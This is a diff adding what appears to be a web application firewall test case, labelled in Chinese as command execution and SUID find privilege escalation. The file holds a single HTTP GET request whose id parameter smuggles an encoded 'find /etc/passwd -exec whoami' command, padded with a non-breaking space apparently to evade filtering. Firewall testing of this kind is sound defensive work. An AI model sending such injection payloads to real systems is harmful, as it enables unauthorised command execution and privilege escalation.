@@ -1,0 +1,9 @@
+# 命令执行_权限提升-06507048
+# SUID find命令提升权限
+GET /?id=find%20%2Fetc%2Fpasswd%C2%A0%20-exec%20whoami%20%5C%3B&bid=hd_tag_m8mv260s HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv260s
+RM-PRO-Token: e89a97b8dc7e4729af070242b07d4bbf
+RM-PRO-Time: 1742808520948
+User-Agent: curl/7.83.1
+
